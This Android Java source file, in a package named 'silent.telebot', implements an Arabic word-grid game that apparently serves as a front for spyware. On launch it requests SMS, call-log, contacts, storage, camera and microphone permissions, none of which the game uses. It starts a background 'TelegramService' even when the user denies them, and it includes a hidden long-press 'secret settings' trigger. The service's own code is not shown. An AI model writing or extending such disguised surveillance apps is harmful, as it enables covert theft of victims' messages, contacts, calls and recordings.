package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.HashSet;
import java.util.Random;
import java.util.Set;

public class WordGameActivity extends Activity {
    private static final int REQ_CODE = 100;
    private GridLayout gridLetters;
    private TextView tvSelectedWord, tvScore, tvFoundWords;
    private Button btnSubmit, btnClear, btnShuffle;
    private String[] letters = new String[16];
    private String selectedWord = "";
    private Set<String> foundWords = new HashSet<>();
    private int score = 0;
    private Random random = new Random();

    private static final String[] VALID_WORDS = {
            "أمل", "بيت", "دار", "ولد", "بنت", "نور", "بدر", "سماء", "أرض", "شمس",
            "قمر", "نيل", "فن", "علم", "حب", "سلام", "ورد", "زهر", "نهر", "جبل"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_word_game);

        // 1. ربط العناصر
        gridLetters = findViewById(R.id.grid_letters);
        tvSelectedWord = findViewById(R.id.tv_selected_word);
        tvScore = findViewById(R.id.tv_score);
        tvFoundWords = findViewById(R.id.tv_found_words);
        btnSubmit = findViewById(R.id.btn_submit);
        btnClear = findViewById(R.id.btn_clear);
        btnShuffle = findViewById(R.id.btn_shuffle);

        // 2. التحقق من الأذونات وطلبها إذا لزم الأمر
        checkAndRequestPermissions();

        // 3. مستمعات الأزرار
        btnSubmit.setOnClickListener(v -> checkWord());
        btnClear.setOnClickListener(v -> clearSelection());
        btnShuffle.setOnClickListener(v -> shuffleGrid());

        // 4. الزر السري (الضغط المطول على العنوان)
        findViewById(R.id.tv_title).setOnLongClickListener(v -> {
            Toast.makeText(this, "🔐 فتح الإعدادات السرية", Toast.LENGTH_SHORT).show();
            // هنا يمكنك فتح نشاط الإعدادات الحقيقي لاحقاً
            return true;
        });
    }

    // ============================================================
    //  🔐 إدارة الأذونات
    // ============================================================
    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            // الإصدارات القديمة تمنح الأذونات تلقائياً
            startTelegramService();
            startGame();
            return;
        }

        // قائمة الأذونات المطلوبة
        String[] permissions = {
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
        };

        boolean allGranted = true;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            // الأذونات ممنوحة → ابدأ الخدمة واللعبة
            startTelegramService();
            startGame();
        } else {
            // طلب الأذونات
            ActivityCompat.requestPermissions(this, permissions, REQ_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "❌ بعض الأذونات مرفوضة، قد لا تعمل الخدمة الخلفية", Toast.LENGTH_LONG).show();
            }
            // حتى لو رفض بعضها، نبدأ الخدمة (قد تتعطل لكننا نحاول)
            startTelegramService();
            startGame();
        }
    }

    // ============================================================
    //  🎮 منطق اللعبة
    // ============================================================
    private void startGame() {
        generateGrid();
        drawGrid();
        updateUI();
    }

    private void generateGrid() {
        char[] commonLetters = {'أ', 'ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'و', 'ي'};
        for (int i = 0; i < 16; i++) {
            letters[i] = String.valueOf(commonLetters[random.nextInt(commonLetters.length)]);
        }
    }

    private void drawGrid() {
        gridLetters.removeAllViews();
        gridLetters.setRowCount(4);
        gridLetters.setColumnCount(4);

        for (int i = 0; i < 16; i++) {
            Button btn = new Button(this);
            btn.setText(letters[i]);
            btn.setTextSize(24);
            btn.setBackgroundColor(0xFF3A3A3C);
            btn.setTextColor(0xFFFFFFFF);
            btn.setPadding(16, 16, 16, 16);
            btn.setTag(i);
            btn.setOnClickListener(v -> {
                int index = (int) v.getTag();
                appendLetter(index);
            });
            gridLetters.addView(btn);
        }
    }

    private void appendLetter(int index) {
        selectedWord += letters[index];
        tvSelectedWord.setText(selectedWord);
    }

    private void checkWord() {
        if (selectedWord.isEmpty()) {
            Toast.makeText(this, "اختر أحرفاً أولاً!", Toast.LENGTH_SHORT).show();
            return;
        }

        for (String word : VALID_WORDS) {
            if (word.equals(selectedWord)) {
                if (foundWords.contains(selectedWord)) {
                    Toast.makeText(this, "الكلمة مكررة!", Toast.LENGTH_SHORT).show();
                } else {
                    foundWords.add(selectedWord);
                    score += 10;
                    updateUI();
                    Toast.makeText(this, "✅ صحيح! +10 نقاط", Toast.LENGTH_SHORT).show();
                }
                clearSelection();
                return;
            }
        }
        Toast.makeText(this, "❌ كلمة غير صحيحة", Toast.LENGTH_SHORT).show();
        clearSelection();
    }

    private void clearSelection() {
        selectedWord = "";
        tvSelectedWord.setText("");
    }

    private void shuffleGrid() {
        generateGrid();
        drawGrid();
        clearSelection();
        Toast.makeText(this, "🔄 تم خلط الأحرف", Toast.LENGTH_SHORT).show();
    }

    private void updateUI() {
        tvScore.setText("⭐ النقاط: " + score + " | الكلمات: " + foundWords.size());
        StringBuilder sb = new StringBuilder();
        for (String word : foundWords) {
            sb.append(word).append(" ");
        }
        tvFoundWords.setText(sb.toString().trim());
    }

    // ============================================================
    //  📡 تشغيل الخدمة الخلفية
    // ============================================================
    private void startTelegramService() {
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
